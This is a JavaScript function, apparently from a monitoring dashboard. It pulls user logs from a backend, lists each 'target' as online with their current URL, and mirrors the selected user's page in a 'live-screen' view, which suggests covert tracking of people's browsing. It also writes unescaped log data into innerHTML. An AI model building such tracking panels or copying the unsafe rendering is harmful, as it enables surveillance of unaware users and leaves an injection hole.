async function refrescarPanel() {
    const res = await fetch(`${SB_URL}/rest/v1/logs?select=*&order=timestamp.desc`, {headers: {'apikey': SB_KEY}});
    const todosLosLogs = await res.json();
    
    // FILTRAR PARA QUE NO HAYA DUPLICADOS (La magia está aquí)
    const usuariosUnicos = [];
    const mapa = new Map();
    
    for (const log of todosLosLogs) {
        if (!mapa.has(log.usuario_id)) {
            mapa.set(log.usuario_id, true);
            usuariosUnicos.push(log);
        }
    }

    const listaUI = document.getElementById('user-list');
    listaUI.innerHTML = usuariosUnicos.map(u => `
        <div class="user-card ${currentTarget === u.usuario_id ? 'active' : ''}" onclick="seleccionar('${u.usuario_id}')">
            <div style="display:flex; justify-content:space-between;">
                <b>ID: ${u.usuario_id}</b>
                <span style="color:lime">● ONLINE</span>
            </div>
            <small style="color:#888">${u.url_actual.substring(0, 40)}...</small>
        </div>
    `).join('');

    // Actualizar pantalla si hay alguien seleccionado
    if (currentTarget) {
        const miUser = usuariosUnicos.find(x => x.usuario_id === currentTarget);
        if (miUser) {
            document.getElementById('live-screen').src = miUser.url_actual;
        }
    }
}
